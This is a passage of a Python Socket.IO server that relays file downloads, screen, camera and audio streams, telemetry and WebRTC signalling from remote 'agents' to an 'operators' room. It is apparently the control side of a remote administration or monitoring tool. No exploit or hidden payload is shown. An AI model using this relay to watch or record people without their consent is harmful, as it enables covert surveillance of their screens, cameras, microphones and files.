            # If no local_path was specified, send the chunks to the frontend for browser download
            emit('file_download_chunk', {
                'agent_id': agent_id,
                'filename': filename,
                'download_id': download_id,
                'chunk': chunk,
                'offset': offset,
                'total_size': total_size
            }, room=requester_sid or 'operators')
        
        del DOWNLOAD_BUFFERS[download_id]
    else:
        # Continue sending chunks to frontend for progress update
        requester_sid = DOWNLOAD_BUFFERS[download_id].get("requester_sid")
        emit('file_download_chunk', {
            'agent_id': agent_id,
            'filename': filename,
            'download_id': download_id,
            'chunk': chunk,
            'offset': offset,
            'total_size': total_size
        }, room=requester_sid or 'operators')

@socketio.on('file_range_response')
def handle_file_range_response(data):
    request_id = data.get('request_id')
    if not request_id:
        return
    with FILE_WAITERS_LOCK:
        waiter = FILE_RANGE_WAITERS.get(request_id)
        if waiter:
            waiter['data'] = data
            waiter['event'].set()

@socketio.on('file_thumbnail_response')
def handle_file_thumbnail_response(data):
    request_id = data.get('request_id')
    if not request_id:
        return
    with FILE_WAITERS_LOCK:
        waiter = FILE_THUMB_WAITERS.get(request_id)
        if waiter:
            waiter['data'] = data
            waiter['event'].set()

@socketio.on('file_faststart_response')
def handle_file_faststart_response(data):
    request_id = data.get('request_id')
    if not request_id:
        return
    with FILE_WAITERS_LOCK:
        waiter = FILE_FASTSTART_WAITERS.get(request_id)
        if waiter:
            waiter['data'] = data
            waiter['event'].set()

@socketio.on('file_upload_progress')
def handle_file_upload_progress(data):
    """Forward file upload progress from agent to UI"""
    print(f"📊 Upload progress: {data.get('filename')} - {data.get('progress')}%")
    emit('file_upload_progress', data, room='operators')

@socketio.on('file_upload_complete')
def handle_file_upload_complete(data):
    """Forward file upload completion from agent to UI"""
    print(f"✅ Upload complete: {data.get('filename')} ({data.get('size')} bytes)")
    emit('file_upload_complete', data, room='operators')

@socketio.on('file_download_progress')
def handle_file_download_progress(data):
    """Forward file download progress from agent to UI"""
    print(f"📊 Download progress: {data.get('filename')} - {data.get('progress')}%")
    dlid = data.get('download_id')
    if dlid and dlid in DOWNLOAD_BUFFERS:
        requester_sid = DOWNLOAD_BUFFERS[dlid].get('requester_sid')
        emit('file_download_progress', data, room=requester_sid or 'operators')
    else:
        emit('file_download_progress', data, room='operators')

@socketio.on('file_download_complete')
def handle_file_download_complete(data):
    """Forward file download completion from agent to UI"""
    print(f"✅ Download complete: {data.get('filename')} ({data.get('size')} bytes)")
    dlid = data.get('download_id')
    if dlid and dlid in DOWNLOAD_BUFFERS:
        requester_sid = DOWNLOAD_BUFFERS[dlid].get('requester_sid')
        emit('file_download_complete', data, room=requester_sid or 'operators')
    else:
        emit('file_download_complete', data, room='operators')

# Global variables for WebRTC and video streaming
WEBRTC_PEER_CONNECTIONS = {}
WEBRTC_VIEWER_CONNECTIONS = {}
VIDEO_FRAMES_H264 = defaultdict(lambda: None)
CAMERA_FRAMES_H264 = defaultdict(lambda: None)
AUDIO_FRAMES_OPUS = defaultdict(lambda: None)
STREAM_FRAME_SEQ = defaultdict(lambda: 0)
STREAM_CHUNK_SIZE_DEFAULT = 16 * 1024
STREAM_BIN_CHUNK_SIZE_DEFAULT = 32 * 1024
STREAM_CHUNK_SIZES = defaultdict(lambda: STREAM_CHUNK_SIZE_DEFAULT)
STREAM_BIN_CHUNK_SIZES = defaultdict(lambda: STREAM_BIN_CHUNK_SIZE_DEFAULT)

@socketio.on('screen_frame')
def handle_screen_frame(data):
    """Accept H.264 (or JPEG for fallback) frames from agent and forward to operators.
    In fallback mode, split large base64 frames into small chunks to improve delivery on low bandwidth."""
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if not agent_id or frame is None:
        return
    try:
        # Store latest (raw) frame for server-side APIs
        VIDEO_FRAMES_H264[agent_id] = frame
        # Normalize to base64 string for browser fallback
        if isinstance(frame, (bytes, bytearray)):
            b64 = base64.b64encode(frame).decode('utf-8')
        elif isinstance(frame, str):
            s = frame.strip()
            b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
        else:
            return
        # Chunk and emit small packets (base64)
        STREAM_FRAME_SEQ[agent_id] += 1
        fid = STREAM_FRAME_SEQ[agent_id]
        total_size = len(b64)
        chunk_size = STREAM_CHUNK_SIZES[agent_id]
        if total_size <= chunk_size:
            emit('screen_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
            return
        for off in range(0, total_size, chunk_size):
            chunk = b64[off:off + chunk_size]
            emit('screen_frame_chunk', {
                'agent_id': agent_id,
                'frame_id': fid,
                'chunk': chunk,
                'offset': off,
                'total_size': total_size
            }, room='operators')
        # Also emit binary chunks (preferred on modern clients)
        try:
            if isinstance(frame, str):
                raw = base64.b64decode(b64)
            else:
                raw = bytes(frame)
            total_bin = len(raw)
            bin_size = STREAM_BIN_CHUNK_SIZES[agent_id]
            for off in range(0, total_bin, bin_size):
                chunk = raw[off:off + bin_size]
                emit('screen_frame_bin_chunk', {
                    'agent_id': agent_id,
                    'frame_id': fid,
                    'chunk': chunk,
                    'offset': off,
                    'total_size': total_bin
                }, room='operators')
        except Exception as _e:
            pass
    except Exception as e:
        print(f"Error handling screen_frame for {agent_id}: {e}")

@socketio.on('request_video_frame')
def handle_request_video_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in VIDEO_FRAMES_H264:
        frame = VIDEO_FRAMES_H264[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        try:
            if isinstance(frame, (bytes, bytearray)):
                b64 = base64.b64encode(frame).decode('utf-8')
            elif isinstance(frame, str):
                s = frame.strip()
                b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
            else:
                return
            emit('video_frame', {'frame': b64})
        except Exception:
            pass

@socketio.on('request_audio_frame')
def handle_request_audio_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in AUDIO_FRAMES_OPUS:
        frame = AUDIO_FRAMES_OPUS[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        try:
            if isinstance(frame, (bytes, bytearray)):
                b64 = base64.b64encode(frame).decode('utf-8')
            elif isinstance(frame, str):
                s = frame.strip()
                b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
            else:
                return
            emit('audio_frame', {'frame': b64})
        except Exception:
            pass

@socketio.on('request_camera_frame')
def handle_request_camera_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in CAMERA_FRAMES_H264:
        frame = CAMERA_FRAMES_H264[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        try:
            if isinstance(frame, (bytes, bytearray)):
                b64 = base64.b64encode(frame).decode('utf-8')
            elif isinstance(frame, str):
                s = frame.strip()
                b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
            else:
                return
            emit('camera_frame', {'frame': b64})
        except Exception:
            pass



@socketio.on('camera_frame')
def handle_camera_frame(data):
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if not agent_id or frame is None:
        return
    try:
        CAMERA_FRAMES_H264[agent_id] = frame
        if isinstance(frame, (bytes, bytearray)):
            b64 = base64.b64encode(frame).decode('utf-8')
        elif isinstance(frame, str):
            s = frame.strip()
            b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
        else:
            return
        STREAM_FRAME_SEQ[agent_id] += 1
        fid = STREAM_FRAME_SEQ[agent_id]
        total_size = len(b64)
        chunk_size = STREAM_CHUNK_SIZES[agent_id]
        if total_size <= chunk_size:
            emit('camera_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
            return
        for off in range(0, total_size, chunk_size):
            chunk = b64[off:off + chunk_size]
            emit('camera_frame_chunk', {
                'agent_id': agent_id,
                'frame_id': fid,
                'chunk': chunk,
                'offset': off,
                'total_size': total_size
            }, room='operators')
        # Also emit binary chunks (preferred on modern clients)
        try:
            if isinstance(frame, str):
                raw = base64.b64decode(b64)
            else:
                raw = bytes(frame)
            total_bin = len(raw)
            bin_size = STREAM_BIN_CHUNK_SIZES[agent_id]
            for off in range(0, total_bin, bin_size):
                chunk = raw[off:off + bin_size]
                emit('camera_frame_bin_chunk', {
                    'agent_id': agent_id,
                    'frame_id': fid,
                    'chunk': chunk,
                    'offset': off,
                    'total_size': total_bin
                }, room='operators')
        except Exception as _e:
            pass
    except Exception as e:
        print(f"Error handling camera_frame for {agent_id}: {e}")

@socketio.on('audio_frame')
def handle_audio_frame(data):
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if agent_id and frame:
        AUDIO_FRAMES_OPUS[agent_id] = frame
        # Forward frame to operators room for real-time streaming
        emit('audio_frame', data, room='operators')

@socketio.on('agent_telemetry')
def handle_agent_telemetry(data):
    """Telemetry from agent; update AGENTS_DATA and relay summary to operators."""
    agent_id = data.get('agent_id')
    if agent_id in AGENTS_DATA:
        AGENTS_DATA[agent_id]['cpu_usage'] = data.get('cpu', 0)
        AGENTS_DATA[agent_id]['memory_usage'] = data.get('memory', 0)
        AGENTS_DATA[agent_id]['network_usage'] = data.get('network', 0)
        try:
            latency = float(data.get('latency_ms') or data.get('latency') or 0)
            loss = float(data.get('packet_loss') or 0)
            mgr = getattr(handle_agent_telemetry, '_mgr', None)
            if mgr is None:
                mgr = AdaptiveStreamingManager()
                handle_agent_telemetry._mgr = mgr
            mgr.adjust_quality(agent_id, latency, loss)
            q = mgr.agent_quality.get(agent_id)
            if q:
                AGENT_FEATURE_FLAGS[agent_id]['quality_level'] = q
        except Exception:
            pass
        emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)

# --- WebRTC Socket.IO Event Handlers ---

@socketio.on('webrtc_offer')
def handle_webrtc_offer(data):
    """Handle WebRTC offer from agent"""
    agent_id = data.get('agent_id')
    offer_sdp = data.get('offer') or data.get('offer_sdp')
    
    if not agent_id or not offer_sdp:
        emit('webrtc_error', {'message': 'Invalid offer data'}, room=request.sid)
        return
    
    try:
        # Create or get existing peer connection
        if agent_id not in WEBRTC_PEER_CONNECTIONS:
            pc = create_webrtc_peer_connection(agent_id)
            if not pc:
                emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=request.sid)
                return
        else:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        
        # Set remote description (offer)
        offer = RTCSessionDescription(sdp=offer_sdp, type='offer')
        
        # Use proper async handling for WebRTC operations
        def handle_webrtc_offer_async():
            try:
                loop = asyncio.get_event_loop()
                # Set remote description
                asyncio.run_coroutine_threadsafe(pc.setRemoteDescription(offer), loop)
                # Create answer
                future = asyncio.run_coroutine_threadsafe(pc.createAnswer(), loop)
                future.add_done_callback(lambda f: handle_answer_created(f, agent_id, request.sid))
            except RuntimeError:
                # No event loop, run synchronously
                async def async_operations():
                    await pc.setRemoteDescription(offer)
                    answer = await pc.createAnswer()
                    handle_answer_created_sync(answer, agent_id, request.sid)
                asyncio.run(async_operations())
        
        # Run in thread to avoid blocking
        import threading
        threading.Thread(target=handle_webrtc_offer_async, daemon=True).start()
        
        print(f"WebRTC offer received from {agent_id}")
        
    except Exception as e:
        print(f"Error handling WebRTC offer from {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error processing offer: {str(e)}'}, room=request.sid)

def handle_answer_created(future, agent_id, sid):
    """Handle WebRTC answer creation"""
    try:
        answer = future.result()
        
        # Use proper async handling for setLocalDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(WEBRTC_PEER_CONNECTIONS[agent_id].setLocalDescription(answer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_local_desc():
                await WEBRTC_PEER_CONNECTIONS[agent_id].setLocalDescription(answer)
            asyncio.run(set_local_desc())
        
        # Send answer back to agent
        socketio.emit('webrtc_answer', {
            'answer': answer.sdp,
            'sdp': answer.sdp,
            'type': answer.type
        }, room=sid)
        
        print(f"WebRTC answer sent to {agent_id}")
        
    except Exception as e:
        print(f"Error creating WebRTC answer for {agent_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error creating answer: {str(e)}'}, room=sid)

def handle_answer_created_sync(answer, agent_id, sid):
    """Handle WebRTC answer creation for synchronous context"""
    try:
        # Send answer back to agent
        socketio.emit('webrtc_answer', {
            'answer': answer.sdp,
            'sdp': answer.sdp,
            'type': answer.type
        }, room=sid)
        
        print(f"WebRTC answer sent to {agent_id}")
        
    except Exception as e:
        print(f"Error sending WebRTC answer for {agent_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error sending answer: {str(e)}'}, room=sid)

@socketio.on('webrtc_ice_candidate')
def handle_webrtc_ice_candidate(data):
    """Handle ICE candidate from agent"""
    agent_id = data.get('agent_id')
    candidate = data.get('candidate')
    
    if not agent_id or not candidate or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        
        # Use proper async handling for addIceCandidate
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(pc.addIceCandidate(candidate), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def add_ice_candidate():
                await pc.addIceCandidate(candidate)
            asyncio.run(add_ice_candidate())
            
        print(f"ICE candidate added for {agent_id}")
        
    except Exception as e:
        print(f"Error adding ICE candidate for {agent_id}: {e}")

# @socketio.on('webrtc_start_streaming')
# def handle_webrtc_start_streaming(data):
#     """Handle WebRTC streaming start request"""
#     agent_id = data.get('agent_id')
#     stream_type = data.get('type', 'all')  # screen, audio, camera, all
#     
#     if not agent_id:
#         emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
#         return
#     
#     try:
#         # Ensure peer connection exists
#         if agent_id not in WEBRTC_PEER_CONNECTIONS:
#             pc = create_webrtc_peer_connection(agent_id)
#             if not pc:
#                 emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=request.sid)
#                 return
#         
#         # Notify agent to start WebRTC streaming
#         emit('start_webrtc_streaming', {
#             'type': stream_type,
#             'ice_servers': WEBRTC_CONFIG['ice_servers'],
#             'codecs': WEBRTC_CONFIG['codecs']
#         }, room=request.sid)
#         
#         print(f"WebRTC streaming started for {agent_id} ({stream_type})")
#         
#     except Exception as e:
#         print(f"Error starting WebRTC streaming for {agent_id}: {e}")
#         emit('webrtc_error', {'message': f'Error starting streaming: {str(e)}'}, room=request.sid)

# @socketio.on('webrtc_stop_streaming')
# def handle_webrtc_stop_streaming(data):
#     """Handle WebRTC streaming stop request"""
#     agent_id = data.get('agent_id')
#     
#     if not agent_id:
#         emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
#         return
#     
#     try:
#         # Close WebRTC connection
#         close_webrtc_connection(agent_id)
#         
#         # Notify agent to stop WebRTC streaming
#         emit('stop_webrtc_streaming', {}, room=request.sid)
#         
#         print(f"WebRTC streaming stopped for {agent_id}")
#         
#     except Exception as e:
#         print(f"Error stopping WebRTC streaming for {agent_id}: {e}")
#         emit('webrtc_error', {'message': f'Error stopping streaming: {str(e)}'}, room=request.sid)

@socketio.on('webrtc_get_stats')
def handle_webrtc_get_stats(data):
    """Handle WebRTC stats request"""
    agent_id = data.get('agent_id')
    
    if not agent_id:
        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        stats = get_webrtc_stats(agent_id)
        if stats:
            emit('webrtc_stats', stats, room=request.sid)
        else:
            emit('webrtc_error', {'message': 'No WebRTC connection found'}, room=request.sid)
        
    except Exception as e:
        print(f"Error getting WebRTC stats for {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error getting stats: {str(e)}'}, room=request.sid)

@socketio.on('webrtc_set_quality')
def handle_webrtc_set_quality(data):
    """Handle WebRTC quality settings"""
    agent_id = data.get('agent_id')
    quality = data.get('quality', 'auto')  # low, medium, high, auto
    
    if not agent_id:
        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
        if agent_sid:
            try:
                q = str(quality).lower()
                if q == 'poor' or q == 'very_low':
                    STREAM_CHUNK_SIZES[agent_id] = 4 * 1024
                    STREAM_BIN_CHUNK_SIZES[agent_id] = 4 * 1024
                elif q == 'low':
                    STREAM_CHUNK_SIZES[agent_id] = 8 * 1024
                    STREAM_BIN_CHUNK_SIZES[agent_id] = 8 * 1024
                elif q == 'medium':
                    STREAM_CHUNK_SIZES[agent_id] = 16 * 1024
                    STREAM_BIN_CHUNK_SIZES[agent_id] = 16 * 1024
                elif q == 'high':
                    STREAM_CHUNK_SIZES[agent_id] = 32 * 1024
                    STREAM_BIN_CHUNK_SIZES[agent_id] = 32 * 1024
                else:
                    STREAM_CHUNK_SIZES[agent_id] = STREAM_CHUNK_SIZE_DEFAULT
                    STREAM_BIN_CHUNK_SIZES[agent_id] = STREAM_BIN_CHUNK_SIZE_DEFAULT
            except Exception:
                pass
            emit('set_webrtc_quality', {'quality': quality}, room=agent_sid)
            emit('fallback_set_quality', {'quality': quality}, room=agent_sid)
            print(f"WebRTC quality set to {quality} for {agent_id}")
        else:
            emit('webrtc_error', {'message': f'Agent {agent_id} not connected'}, room=request.sid)
    
    except Exception as e:
        print(f"Error setting WebRTC quality for {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error setting quality: {str(e)}'}, room=request.sid)

# --- WebRTC Viewer Management ---

@socketio.on('webrtc_viewer_connect')
def handle_webrtc_viewer_connect(data):
    """Handle WebRTC viewer connection"""
    viewer_id = request.sid
    agent_id = data.get('agent_id')
    
    if not agent_id or agent_id not in WEBRTC_STREAMS:
        emit('webrtc_error', {'message': 'Agent not available for WebRTC'}, room=request.sid)
        return
    
    try:
        # Create viewer peer connection
        viewer_pc = RTCPeerConnection()
        
        # Configure ICE servers
        for ice_server in WEBRTC_CONFIG['ice_servers']:
            viewer_pc.addIceServer(ice_server)
        
        # Store viewer data
        WEBRTC_VIEWERS[viewer_id] = {
            'agent_id': agent_id,
            'pc': viewer_pc,
            'streams': {}
        }
        
        # Add existing tracks from agent
        agent_streams = WEBRTC_STREAMS[agent_id]
        for track_kind, tracks in agent_streams.items():
            try:
                if isinstance(tracks, list):
                    for t in tracks:
                        sender = viewer_pc.addTrack(t)
                        if track_kind not in WEBRTC_VIEWERS[viewer_id]['streams']:
                            WEBRTC_VIEWERS[viewer_id]['streams'][track_kind] = []
                        WEBRTC_VIEWERS[viewer_id]['streams'][track_kind].append(sender)
                else:
                    sender = viewer_pc.addTrack(tracks)
                    WEBRTC_VIEWERS[viewer_id]['streams'][track_kind] = [sender]
            except Exception as e:
                print(f"Error adding track {track_kind} to viewer {viewer_id}: {e}")
        
        # Set up viewer event handlers
        @viewer_pc.on("connectionstatechange")
        async def on_viewer_connectionstatechange():
            print(f"Viewer {viewer_id} connection state: {viewer_pc.connectionState}")
            if viewer_pc.connectionState == "failed":
                await viewer_pc.close()
                if viewer_id in WEBRTC_VIEWERS:
                    del WEBRTC_VIEWERS[viewer_id]
        
        @viewer_pc.on("icecandidate")
        def on_viewer_icecandidate(candidate):
            if candidate:
                emit('webrtc_ice_candidate', {
                    'agent_id': agent_id,
                    'candidate': candidate
                }, room=viewer_id)
        
        # Create offer for viewer
        def create_viewer_offer():
            try:
                loop = asyncio.get_event_loop()
                future = asyncio.run_coroutine_threadsafe(viewer_pc.createOffer(), loop)
                future.add_done_callback(lambda f: handle_viewer_offer_created(f, viewer_id))
            except RuntimeError:
                # No event loop, run synchronously
                async def create_offer():
                    offer = await viewer_pc.createOffer()
                    handle_viewer_offer_created_sync(offer, viewer_id)
                asyncio.run(create_offer())
        
        # Run in thread to avoid blocking
        threading.Thread(target=create_viewer_offer, daemon=True).start()
        
        print(f"WebRTC viewer {viewer_id} connected to agent {agent_id}")
        
    except Exception as e:
        print(f"Error connecting WebRTC viewer {viewer_id} to agent {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error connecting viewer: {str(e)}'}, room=request.sid)

def handle_viewer_offer_created(future, viewer_id):
    """Handle viewer offer creation"""
    try:
        offer = future.result()
        
        # Use proper async handling for setLocalDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(WEBRTC_VIEWERS[viewer_id]['pc'].setLocalDescription(offer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_local_desc():
                await WEBRTC_VIEWERS[viewer_id]['pc'].setLocalDescription(offer)
            asyncio.run(set_local_desc())
        
        # Send offer to viewer
        socketio.emit('webrtc_viewer_offer', {
            'offer': offer.sdp,
            'type': offer.type
        }, room=viewer_id)
        
        print(f"WebRTC viewer offer sent to {viewer_id}")
        
    except Exception as e:
        print(f"Error creating WebRTC viewer offer for {viewer_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error creating viewer offer: {str(e)}'}, room=viewer_id)

def handle_viewer_offer_created_sync(offer, viewer_id):
    """Handle viewer offer creation for synchronous context"""
    try:
        # Send offer to viewer
        socketio.emit('webrtc_viewer_offer', {
            'offer': offer.sdp,
            'type': offer.type
        }, room=viewer_id)
        
        print(f"WebRTC viewer offer sent to {viewer_id}")
        
    except Exception as e:
        print(f"Error sending WebRTC viewer offer for {viewer_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error sending viewer offer: {str(e)}'}, room=viewer_id)

@socketio.on('webrtc_viewer_answer')
def handle_webrtc_viewer_answer(data):
    """Handle viewer answer"""
    viewer_id = request.sid
    answer_sdp = data.get('answer')
    
    if not answer_sdp or viewer_id not in WEBRTC_VIEWERS:
        return
    
    try:
        viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
        answer = RTCSessionDescription(sdp=answer_sdp, type='answer')
        
        # Use proper async handling for setRemoteDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.setRemoteDescription(answer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_remote_desc():
                await viewer_pc.setRemoteDescription(answer)
            asyncio.run(set_remote_desc())
            
        print(f"WebRTC viewer answer received from {viewer_id}")
        
    except Exception as e:
        print(f"Error setting viewer answer for {viewer_id}: {e}")

@socketio.on('webrtc_viewer_ice_candidate')
def handle_webrtc_viewer_ice_candidate(data):
    """Handle ICE candidate from viewer"""
    viewer_id = request.sid
    candidate = data.get('candidate')
    
    if not candidate or viewer_id not in WEBRTC_VIEWERS:
        return
    
    try:
        viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.addIceCandidate(candidate), loop)
        except RuntimeError:
            async def add_ice():
                await viewer_pc.addIceCandidate(candidate)
            asyncio.run(add_ice())
        print(f"Viewer ICE candidate added for {viewer_id}")
    except Exception as e:
        print(f"Error adding viewer ICE candidate for {viewer_id}: {e}")

@socketio.on('webrtc_viewer_disconnect')
def handle_webrtc_viewer_disconnect():
    """Handle WebRTC viewer disconnection"""
    viewer_id = request.sid
    
    if viewer_id in WEBRTC_VIEWERS:
        try:
            viewer_pc = WEBRTC_VIEWERS[viewer_id]['pc']
            
            # Use proper async handling for close
            try:
                loop = asyncio.get_event_loop()
                asyncio.run_coroutine_threadsafe(viewer_pc.close(), loop)
            except RuntimeError:
                # No event loop, run synchronously
                async def close_viewer():
                    await viewer_pc.close()
                asyncio.run(close_viewer())
                
            del WEBRTC_VIEWERS[viewer_id]
            print(f"WebRTC viewer {viewer_id} disconnected")
        except Exception as e:
            print(f"Error disconnecting WebRTC viewer {viewer_id}: {e}")

# Advanced WebRTC Monitoring and Optimization Event Handlers
@socketio.on('webrtc_quality_change')
def handle_webrtc_quality_change(data):
    """Handle WebRTC quality change requests from adaptive bitrate control"""
    agent_id = data.get('agent_id')
    quality = data.get('quality')
    bandwidth_stats = data.get('bandwidth_stats')
    
    print(f"Quality change request for {agent_id}: {quality}")
    print(f"Bandwidth stats: {bandwidth_stats}")
    
    # Forward quality change to agent
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('webrtc_quality_change', {
            'quality': quality,
            'bandwidth_stats': bandwidth_stats
        }, room=agent_sid)
        print(f"Quality change command sent to agent {agent_id}")
    else:
        print(f"Agent {agent_id} not found for quality change")
    try:
        q = str(quality).lower()
        if q == 'poor' or q == 'very_low':
            STREAM_CHUNK_SIZES[agent_id] = 4 * 1024
            STREAM_BIN_CHUNK_SIZES[agent_id] = 4 * 1024
        elif q == 'low':
            STREAM_CHUNK_SIZES[agent_id] = 8 * 1024
            STREAM_BIN_CHUNK_SIZES[agent_id] = 8 * 1024
        elif q == 'medium':
            STREAM_CHUNK_SIZES[agent_id] = 16 * 1024
            STREAM_BIN_CHUNK_SIZES[agent_id] = 16 * 1024
        elif q == 'high':
            STREAM_CHUNK_SIZES[agent_id] = 32 * 1024
            STREAM_BIN_CHUNK_SIZES[agent_id] = 32 * 1024
        else:
            STREAM_CHUNK_SIZES[agent_id] = STREAM_CHUNK_SIZE_DEFAULT
            STREAM_BIN_CHUNK_SIZES[agent_id] = STREAM_BIN_CHUNK_SIZE_DEFAULT
    except Exception:
        pass
    try:
        if agent_sid:
            emit('fallback_quality_change', {
                'quality': quality,
                'bandwidth_stats': bandwidth_stats
            }, room=agent_sid)
    except Exception:
        pass

@socketio.on('webrtc_frame_dropping')
def handle_webrtc_frame_dropping(data):
    """Handle WebRTC frame dropping requests from load monitoring"""
    agent_id = data.get('agent_id')
    enabled = data.get('enabled')
    drop_ratio = data.get('drop_ratio', 0.3)
    priority = data.get('priority', 'keyframes_only')
    
    print(f"Frame dropping request for {agent_id}: enabled={enabled}, ratio={drop_ratio}, priority={priority}")
    
    # Forward frame dropping command to agent
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('webrtc_frame_dropping', {
            'enabled': enabled,
            'drop_ratio': drop_ratio,
            'priority': priority
        }, room=agent_sid)
        print(f"Frame dropping command sent to agent {agent_id}")
    else:
        print(f"Agent {agent_id} not found for frame dropping")

@socketio.on('webrtc_get_enhanced_stats')
def handle_webrtc_get_enhanced_stats(data):
    """Get enhanced WebRTC statistics including performance metrics"""
    agent_id = data.get('agent_id')
    
    if not agent_id:
        emit('webrtc_enhanced_stats', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        # Get basic stats
        basic_stats = get_webrtc_stats(agent_id)
        
        # Get bandwidth estimation
        bandwidth_stats = estimate_bandwidth(agent_id)
        
        # Get connection quality
        quality_data = monitor_connection_quality(agent_id)
        
        # Get production readiness assessment
        production_readiness = assess_production_readiness()
        
        enhanced_stats = {
            'agent_id': agent_id,
            'basic_stats': basic_stats,
            'bandwidth_stats': bandwidth_stats,
            'quality_data': quality_data,
            'production_readiness': production_readiness,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        emit('webrtc_enhanced_stats', enhanced_stats, room=request.sid)
        print(f"Enhanced stats sent for agent {agent_id}")
        
    except Exception as e:
        print(f"Error getting enhanced stats for {agent_id}: {e}")
        emit('webrtc_enhanced_stats', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_production_readiness')
def handle_webrtc_get_production_readiness():
    """Get production readiness assessment"""
    try:
        readiness_report = assess_production_readiness()
        emit('webrtc_production_readiness', readiness_report, room=request.sid)
        print("Production readiness report sent")
    except Exception as e:
        print(f"Error getting production readiness: {e}")
        emit('webrtc_production_readiness', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_migration_plan')
def handle_webrtc_get_migration_plan():
    """Get mediasoup migration plan"""
    try:
        migration_plan = generate_mediasoup_migration_plan()
        emit('webrtc_migration_plan', migration_plan, room=request.sid)
        print("Mediasoup migration plan sent")
    except Exception as e:
        print(f"Error getting migration plan: {e}")
        emit('webrtc_migration_plan', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_monitoring_data')
def handle_webrtc_get_monitoring_data():
    """Get comprehensive WebRTC monitoring data"""
    try:
        monitoring_data = enhanced_webrtc_monitoring()
        emit('webrtc_monitoring_data', monitoring_data, room=request.sid)
        print("Comprehensive monitoring data sent")
    except Exception as e:
        print(f"Error getting monitoring data: {e}")
        emit('webrtc_monitoring_data', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_adaptive_bitrate_control')
def handle_webrtc_adaptive_bitrate_control(data):
    """Manually trigger adaptive bitrate control"""
    agent_id = data.get('agent_id')
    current_quality = data.get('current_quality', 'auto')
    
    if not agent_id:
        emit('webrtc_adaptive_bitrate_result', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        result = adaptive_bitrate_control(agent_id, current_quality)
        emit('webrtc_adaptive_bitrate_result', {
            'agent_id': agent_id,
            'result': result,
            'timestamp': datetime.datetime.now().isoformat()
        }, room=request.sid)
        print(f"Adaptive bitrate control result for {agent_id}: {result}")
    except Exception as e:
        print(f"Error in adaptive bitrate control for {agent_id}: {e}")
        emit('webrtc_adaptive_bitrate_result', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_implement_frame_dropping')
def handle_webrtc_implement_frame_dropping(data):
    """Manually trigger frame dropping implementation"""
    agent_id = data.get('agent_id')
    load_threshold = data.get('load_threshold', 0.8)
    
    if not agent_id:
        emit('webrtc_frame_dropping_result', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        result = implement_frame_dropping(agent_id, load_threshold)
        emit('webrtc_frame_dropping_result', {
            'agent_id': agent_id,
            'result': result,
            'load_threshold': load_threshold,
            'timestamp': datetime.datetime.now().isoformat()
        }, room=request.sid)
        print(f"Frame dropping implementation result for {agent_id}: {result}")
    except Exception as e:
        print(f"Error implementing frame dropping for {agent_id}: {e}")
        emit('webrtc_frame_dropping_result', {'error': str(e)}, room=request.sid)

# WebRTC scaffolding code removed - not currently active

@app.route('/api/webrtc/config', methods=['GET'])
def http_webrtc_config():
    try:
        return jsonify({
            'enabled': WEBRTC_CONFIG.get('enabled', False),
            'iceServers': WEBRTC_CONFIG.get('ice_servers', []),
